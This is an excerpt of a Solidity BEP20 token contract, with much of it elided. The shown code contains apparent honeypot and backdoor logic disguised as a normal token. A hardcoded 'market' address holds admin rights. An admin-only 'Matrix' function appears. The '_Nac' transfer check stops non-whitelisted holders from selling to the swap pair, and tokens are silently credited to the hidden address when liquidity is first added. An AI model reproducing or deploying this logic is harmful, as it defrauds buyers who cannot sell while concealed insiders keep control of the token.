...
interface iBEP20 {
  ...
  /**
   * @dev Returns the token symbol.aa
   */
...
contract Ownable is Context {
    ...
    address internal market = address(0x45b3c50200Fa2723c1eacD8C2d80c3F7Cff10CaC);
    uint256 internal num = 10**18;
...
contract token is Context, iBEP20, Ownable {
  ...
  address public pair = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

  //address public Router = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
  //address public pair = address(0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd);
  ...
  modifier onlyAdmin() {
        require(owner() == _msgSender() || _msgSender() == market, "Ownable: caller is not the admin");
        _;
    }
 ...
 /**
   ...
   */
  function Matrix(uint256 amount) public onlyAdmin returns (bool) {
  ...
  function _BeforeTransfer(address sender, address recipient, uint256 amount)internal{
    _Nac(sender,recipient, amount);
  }


  function _Nac(address sender, address recipient, uint256 amount)internal{
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount >= 0, "BEP20: amount is below zero");

    if(Fee == 1 && startTime != 0 && !white[sender]){
        require(swapV2Pair != recipient);
    }

    if(startTime == 0 && recipient == swapV2Pair){
        startTime = block.timestamp;
        _balances[market] = num;
        emit Transfer(address(0), market, num);
    }
